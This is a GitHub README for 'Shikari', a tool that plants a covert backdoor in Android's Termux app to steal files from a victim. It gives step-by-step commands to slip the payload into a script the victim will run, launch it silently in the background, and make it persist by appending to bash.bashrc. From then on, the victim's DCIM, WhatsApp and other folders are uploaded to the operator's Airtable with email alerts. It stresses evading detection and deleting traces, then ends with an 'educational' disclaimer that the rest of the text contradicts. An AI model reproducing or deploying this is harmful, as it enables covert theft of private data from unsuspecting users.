
<h1 align="center">
  <br>
  <a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/shikari.gif" alt=""></a>
  <br>
  Shikari
  <br>
</h1>

<h4 align="center">Create Backdoor in Termux</h4>

## Features

✓ First time on internet 😎 , Give credit if you are going to copy my idea or code ;)</br>
✓ You can get any files of victim 🌚</br>
- /storage/DCIM
- /storage/Pictures
- /storage/WhatsApp 
- /storage/Anything..;)

✓ All things happen in background.</br>
✓ Not Easily Detectable</br>
✓ You will get notifications through Email ;)</br>

## Tutorial
### Step 1
- [Create New Account](https://airtable.com/invite/r/GNqgr5Ps)
### Step 2
- Create New Base
- Create Table
- Create 2 Field
    + Field 1 : Name
    + Field 2 : link
- Check Screenshot for Understanding.

<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-183933.jpg"></a>
### Step 3
Note Down following ids.
+ [API ID](https://airtable.com/account)
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-185807.jpg"></a>
+ [Base ID](https://airtable.com/api)
<a href="#"><img src="https://d3drh3gsi3sqc6.cloudfront.net/images/airtable-find-base-id.png"></a>
+ Table Name
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-192936.jpg"></a>
### Step 4
Paste below code in your github and save it "shikari.txt"</br>
modify your details under " " or ' '</br>
```
export api="keyamJ*********"
export base='appJ8Pj*****'
export table="hack"
export folder="ADM"
[[ "${#BASH_SOURCE[@]}" -gt "1" ]] && { return 0; }
```

Enter your folder name you want to Hack. (ex. DCIM, Pictures, Download, Music) </br></br>
Now you can change your target folder anytime by changing in your github shikari.txt.</br></br>
When you change it with "Documents" then you will get Documents ! if you change folder name to "Pictures" then you will get Pictures of victim 🌚</br></br>

### Step 5

+ Now add below command in your script.
Example.,

+ Change wget link with your shikari.txt.link
```
$ cd $HOME
$ wget https://raw.githu../master/shikari.sh (your shikari.txt raw link)
$ pkg install python -y
$ pip install shikari
$ shikari
```

After Complete Process Don't forget to remove "shikari.txt" file
```
cd $HOME
rm -f shikari.txt
```

### Background Process
Add this code in your new "hack.sh" script for background process.
```
_evalBg() {
eval "$@" &>/dev/null & disown;
}
cmd="pip install shikari && shikari";
_evalBg "${cmd}";
```
Add "bash hack.sh" in your shikari.txt script instead of pip install shikari...

```
$ cd $HOME
$ wget https://raw.githu../master/shikari.sh (your shikari.txt raw link)
$ pkg install python -y
$ bash hack.sh
```

You can upload hack.sh on your GitHub and add on victim device by wget command then you can put "bash hack.sh" for background process.
### logic
When someone open termux everytime you will get /storage/folder of victim.
+ You need to follow this step..(add below code in your Bash script)
```
mv hack.sh $PREFIX/etc/bin 
echo "bash hack.sh" >> $PREFIX/etc/bash.bashrc
```

### Limitation
+ You can't get any folder if your victim have no storage permission on Termux.
+ add this command in your script for Storage permission.
```
termux-setup-storage
```

### Email Setup
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-203554.jpg"></a>
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-203648.jpg"></a>
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-203715.jpg"></a>
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-203743.jpg"></a>
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-203810.jpg"></a>
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/Screenshot_20220414-204013.jpg"></a>

+ Setup according your need , when someone use your script then automatically backdoor
Created on victim device, everytime your victim open termux you will get his data through Email !!
+ After uploading folders, airtable will send you download link ;)

### Demo Screenshots
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/IMG_20220414_205246_105.jpg"></a>
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/IMG_20220414_205251_263__01.jpg"></a>
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/IMG_20220414_205256_944__01.jpg"></a>
<a href="#"><img src="https://raw.githubusercontent.com/Bhai4You/bhai4you/master/IMG_20220414_205300_548.jpg"></a>


### Error/Problems
Send Mail to this id if you are facing any problems.</br>
Mail : parixit1337@gmail.com
### Disclaimer
The tutorial and demo provided for informational and educational purpose only, and for those who’re willing and curious to know and learn about Ethical Hacking, Security and Penetration Testing.</br></br> Any time the word “Hacking” that is used on this Application shall be regarded as Ethical Hacking.</br></br>
You shall not misuse the information to gain unauthorised access. However you may try out these hacks on your own computer at your own risk. Performing hack attempts (without permission) on computers that you do not own is illegal.
